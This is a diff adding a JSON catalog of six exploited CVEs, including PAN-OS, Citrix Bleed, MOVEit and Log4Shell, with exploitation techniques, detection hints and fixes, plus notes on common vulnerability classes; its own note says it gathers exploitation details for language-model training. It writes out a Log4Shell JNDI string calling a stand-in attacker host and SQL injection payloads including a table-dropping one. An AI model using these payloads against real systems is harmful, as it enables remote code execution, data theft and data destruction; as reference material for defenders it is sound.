@@ -1,0 +1,103 @@
+{
+  "_source": "NVD, CISA KEV, VulnDB",
+  "_note": "High-value CVE catalog. Long-tail: specific exploitation details not in generic LLM training.",
+  "critical_cves": [
+    {
+      "cve_id": "CVE-2024-3400",
+      "product": "Palo Alto Networks PAN-OS GlobalProtect",
+      "cvss": 10.0, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+      "type": "OS Command Injection",
+      "description": "Command injection in GlobalProtect feature. Unauthenticated attacker creates arbitrary files on firewall, escalating to OS command execution.",
+      "affected": "PAN-OS 10.2 < 10.2.9-h1, 11.0 < 11.0.4-h1, 11.1 < 11.1.2-h3",
+      "exploit_in_wild": true,
+      "patch_date": "2024-04-14",
+      "cisa_kev_added": "2024-04-12",
+      "exploitation_technique": "HTTP request with crafted SESSID cookie containing path traversal to write PHP webshell",
+      "detection": "Look for unexpected files in /var/appweb/htdocs/ or access to /global-protect/ with non-standard cookies",
+      "fix": "Patch to fixed version; disable GlobalProtect if not needed; enable Threat Prevention to detect early"
+    },
+    {
+      "cve_id": "CVE-2023-4966",
+      "product": "Citrix NetScaler ADC / Gateway (Citrix Bleed)",
+      "cvss": 9.4,
+      "type": "Buffer Over-Read / Sensitive Data Disclosure",
+      "description": "Allows unauthenticated attacker to read memory contents from appliance, leaking session tokens. Active exploitation by ransomware groups.",
+      "affected": "NetScaler ADC and Gateway before 14.1-8.50, 13.1-49.15, 13.0-92.19, 12.1-55.300",
+      "exploit_in_wild": true,
+      "threat_actors": ["LockBit 3.0", "ALPHV/BlackCat", "Medusa ransomware"],
+      "exploitation_technique": "HTTP GET to /oauth/idp/.well-known/openid-configuration returns memory contents including session tokens; attacker authenticates with stolen token",
+      "detection": "Unusual session activity; connections from unexpected IPs using valid session tokens; SIEM alert for token reuse from multiple IPs",
+      "fix": "Immediate patch; terminate all active sessions after patching; audit for prior compromise"
+    },
+    {
+      "cve_id": "CVE-2023-34362",
+      "product": "Progress MOVEit Transfer",
+      "cvss": 9.8,
+      "type": "SQL Injection leading to RCE",
+      "description": "SQL injection in MOVEit Transfer HTTP endpoint. Cl0p ransomware gang exploited before patch was available (zero-day). Led to 2,000+ organization breaches.",
+      "affected": "MOVEit Transfer before 2021.0.6, 2021.1.4, 2022.0.4, 2022.1.5, 2023.0.1",
+      "exploit_in_wild": true,
+      "exploitation_scale": "2,000+ organizations breached; data of 16 million+ individuals exposed",
+      "threat_actors": ["Cl0p/TA505 — attributed by CISA/FBI"],
+      "fix": "Patch immediately; check for unauthorized LEMURLOOT webshell; review azureedge.net traffic"
+    },
+    {
+      "cve_id": "CVE-2024-21887",
+      "product": "Ivanti Connect Secure SSL VPN",
+      "cvss": 9.1,
+      "type": "Command Injection (authenticated)",
+      "description": "Command injection in web component. Chained with CVE-2023-46805 (authentication bypass) for unauthenticated RCE.",
+      "affected": "Ivanti Connect Secure and Policy Secure all versions",
+      "exploit_in_wild": true,
+      "chain_exploit": "CVE-2023-46805 (auth bypass) + CVE-2024-21887 (command injection) = unauthenticated RCE",
+      "threat_actors": ["UNC5221 (China nexus)", "Volt Typhoon"],
+      "cisa_action": "Emergency Directive ED-24-01: Disconnect within 48 hours, factory reset before reconnect"
+    },
+    {
+      "cve_id": "CVE-2022-30190",
+      "product": "Microsoft Windows MSDT (Follina)",
+      "cvss": 7.8,
+      "type": "Remote Code Execution via Microsoft Support Diagnostic Tool",
+      "description": "Office documents calling MSDT protocol handler executes code without macros. Bypasses macro restrictions.",
+      "affected": "Windows 7-11, Server 2008-2022",
+      "exploit_in_wild": true,
+      "exploitation_technique": "Word document with external OLE link to attacker-controlled HTML invoking ms-msdt:// URI scheme",
+      "notable_because": "Bypassed decades of macro-blocking defense; works without enabling macros",
+      "detection": "MSDT.exe with unusual parent process (winword.exe, excel.exe); sdiagnhost.exe spawning child processes"
+    },
+    {
+      "cve_id": "CVE-2021-44228",
+      "product": "Apache Log4j2 (Log4Shell)",
+      "cvss": 10.0,
+      "type": "Remote Code Execution via JNDI Injection",
+      "description": "JNDI injection via log messages. Attacker sends ${jndi:ldap://attacker.com/exploit} in any logged field; Log4j fetches and executes remote class.",
+      "affected": "Log4j2 2.0-2.14.1 (core of Java ecosystem; affected VMware, Apple, Amazon, Google, Twitter etc.)",
+      "exploit_in_wild": true,
+      "historical_significance": "Considered worst vulnerability of the decade; 10.0 CVSS; patched in days but deployment took months",
+      "detection": "${jndi:} pattern in any log field; DNS lookups to external hosts from Java applications; unusual LDAP/RMI outbound connections"
+    }
+  ],
+  "vulnerability_classes": {
+    "sql_injection": {
+      "description": "Attacker inserts SQL commands into input fields",
+      "impact": "Data theft, auth bypass, RCE (via xp_cmdshell on MSSQL)",
+      "prevention": ["Parameterized queries", "ORM with proper escaping", "WAF"],
+      "test_payloads": ["' OR '1'='1", "'; DROP TABLE users;--", "1 UNION SELECT password FROM users"]
+    },
+    "command_injection": {
+      "description": "User input passed to OS shell without sanitization",
+      "impact": "OS command execution with application privilege",
+      "prevention": ["Never pass user input to shell", "Use subprocess with list args", "Input validation/whitelist"]
+    },
+    "ssrf_server_side_request_forgery": {
+      "description": "Server makes HTTP requests to attacker-specified URL",
+      "impact": "Internal network access; cloud metadata theft (AWS IMDSv1: 169.254.169.254)",
+      "prevention": ["Block internal IP ranges from user-specified URLs", "IMDSv2 on AWS"]
+    },
+    "xxe_external_entity": {
+      "description": "XML parser processes external entity references",
+      "impact": "File read, SSRF, RCE in severe cases",
+      "prevention": ["Disable external entities in XML parser", "Use JSON over XML"]
+    }
+  }
+}
